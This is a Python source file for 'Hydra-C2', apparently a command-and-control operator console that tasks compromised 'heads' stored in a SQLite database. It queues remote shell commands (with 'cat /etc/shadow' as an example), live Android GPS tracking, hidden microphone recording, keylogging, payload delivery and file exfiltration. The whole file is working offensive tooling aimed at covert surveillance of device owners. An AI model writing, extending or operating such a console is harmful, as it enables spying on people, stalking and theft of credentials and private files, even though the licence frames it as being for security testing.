"""
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'AGPLv3'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
"""

import sqlite3
import json
import sys
import os
import cmd

DB_PATH = "hydra_heads.db"

class HydraCommander(cmd.Cmd):
    RED = '\033[91m'
    RESET = '\033[0m'
    
    splash = r"""
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
   |  __  | | | |/ _` | '__/ _` | | |      / / 
   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
             __/ |                               
            |___/                                

    >> Hydra-C2 Interactive Operator Console
    """
    
    intro = f"{RED}{splash}{RESET}" + '\nType "usage" to see commands. Type "use <ID>" to begin.\n'
    prompt = '(hydra) > '
    current_target = None

    def do_usage(self, arg):
        """Displays perfectly aligned command interface or specific command help."""
        c, y, g, r, b = "\033[36m", "\033[33m", "\033[32m", "\033[0m", "\033[1m"
        W = 62 

        def p_line(text, color_content=r):
            content = f"{text:<{W}}"
            print(f"│ {color_content}{content}{r}{b} │")

        def p_header(title):
            print(f"\n{b}┌{'─' * (W + 2)}┐")
            p_line(title, c)
            print(f"├{'─' * (W + 2)}┤")

        def p_footer():
            print(f"└{'─' * (W + 2)}┘{r}")

        arg = arg.lower().strip()

        # --- SPECIFIC COMMAND HELP: SHELL ---
        if arg == "shell":
            p_header("COMMAND: SHELL")
            p_line("Description: Executes arbitrary commands on the target host.", g)
            p_line("Syntax:      shell <command>")
            p_line("Example:     shell whoami /all")
            p_line("Example:     shell cat /etc/shadow")
            p_footer()

        # --- SPECIFIC COMMAND HELP: LOCATION ---
        elif arg == "location":
            p_header("COMMAND: LOCATION")
            p_line("Description: GPS Exfiltration and tracking for Android.", g)
            p_line("Syntax:      location          (Single ping)")
            p_line("Syntax:      location start    (30s interval loop)")
            p_line("Syntax:      location stop     (Kill loop)")
            p_footer()

        # --- SPECIFIC COMMAND HELP: DATA MOVEMENT ---
        elif arg in ["download", "upload"]:
            p_header("COMMAND: DATA MOVEMENT")
            p_line("download: Push file from server/loot/ to target.", g)
            p_line("          Syntax: download payload.exe")
            p_line("upload:   Pull file from target to server/exfil/.", g)
            p_line("          Syntax: upload /data/user/0/com.hydra/files/db.db")
            p_footer()

        # --- SPECIFIC COMMAND HELP: SURVEILLANCE ---
        elif arg in ["record", "keylog"]:
            p_header("COMMAND: SURVEILLANCE")
            p_line("record:   Audio capture via remote microphone.", g)
            p_line("          Syntax: record <start/stop>")
            p_line("keylog:   Keystroke capture (Desktop Head only).", g)
            p_line("          Syntax: keylog <start/stop>")
            p_footer()

        # --- DEFAULT: FULL BOXED MENU ---
        else:
            p_header("HYDRA-C2 COMMAND SPECIFICATION v1.6")
            p_line("SESSION MANAGEMENT", y)
            p_line("  list               - Show all registered Hydra Heads")
            p_line("  use <id>           - Select active target for commanding")
            p_line("  exit               - Shut down operator console")
            print(f"├{'─' * (W + 2)}┤")
            p_line("SURVEILLANCE & INTELLIGENCE", y)
            p_line("  location           - Request single GPS ping (Android)")
            p_line("  location <start/stop> - Live 30s tracking loop (Android)")
            p_line("  record <start/stop>   - Background MIC recording (All)")
            p_line("  keylog <start/stop>   - Persistent Keystroke Capture (Desktop)")
            print(f"├{'─' * (W + 2)}┤")
            p_line("INTERACTION & EXECUTION", y)
            p_line("  shell <cmd>        - Execute remote shell command")
            p_line("  msg <text>         - Pop-up system message box")
            p_line("  vibrate <ms>       - Trigger hardware vibration (Android)")
            print(f"├{'─' * (W + 2)}┤")
            p_line("DATA MOVEMENT", y)
            p_line("  download <file>    - Push file from server/loot/ to target")
            p_line("  upload <path>      - Pull file from target to server/exfil/")
            print(f"├{'─' * (W + 2)}┤")
            p_line("TIPS", y)
            p_line("  Type 'usage <command>' for detailed syntax and examples.")
            p_footer()

    # Alias help to usage
    def do_help(self, arg):
        self.do_usage(arg)

    # --- DATABASE LOGIC ---
    def add_task(self, client_id, action, payload):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        payload_json = json.dumps(payload)
        cursor.execute("INSERT INTO tasks (client_id, action, payload, status) VALUES (?, ?, ?, 'pending')", 
                       (client_id, action, payload_json))
        conn.commit()
        conn.close()
        print(f"[+] Task '{action}' added for {client_id}")

    # --- COMMAND MAPPING ---
    def do_list(self, arg):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT client_id, platform, last_seen FROM clients")
        rows = cursor.fetchall()
        conn.close()
        print("\n--- Available Hydra Heads ---")
        for row in rows:
            print(f"ID: {row[0]} | Platform: {row[1]} | Last Seen: {row[2]}")
        print("")

    def do_use(self, arg):
        if not arg:
            print("[-] Usage: use <ID>")
            return
        self.current_target = arg
        self.prompt = f"(hydra:{self.RED}{arg}{self.RESET}) > "
        print(f"[*] Targeting: {arg}")

    def do_location(self, arg):
        if not self.current_target: return
        if arg == "start": self.add_task(self.current_target, "location_start", {})
        elif arg == "stop": self.add_task(self.current_target, "location_stop", {})
        else: self.add_task(self.current_target, "location", {})

    def do_record(self, arg):
        if not self.current_target: return
        if arg == "start": self.add_task(self.current_target, "record_start", {})
        elif arg == "stop": self.add_task(self.current_target, "record_stop", {})

    def do_keylog(self, arg):
        if not self.current_target: return
        if arg == "start": self.add_task(self.current_target, "keylog_start", {})
        elif arg == "stop": self.add_task(self.current_target, "keylog_stop", {})

    def do_shell(self, arg):
        if not self.current_target: return
        self.add_task(self.current_target, "shell", {"cmd": arg})

    def do_msg(self, arg):
        if not self.current_target: return
        self.add_task(self.current_target, "msg", {"content": arg})

    def do_vibrate(self, arg):
        if not self.current_target: return
        try: self.add_task(self.current_target, "vibrate", {"duration": int(arg)})
        except: print("[-] Error: Duration must be an integer.")

    def do_download(self, arg):
        if not self.current_target: return
        self.add_task(self.current_target, "download", {"filename": arg})

    def do_upload(self, arg):
        if not self.current_target: return
        self.add_task(self.current_target, "upload", {"path": arg})

    def do_exit(self, arg):
        print("[-] Shutting down operator console.")
        return True

    def do_EOF(self, arg):
        return True

if __name__ == "__main__":
    HydraCommander().cmdloop()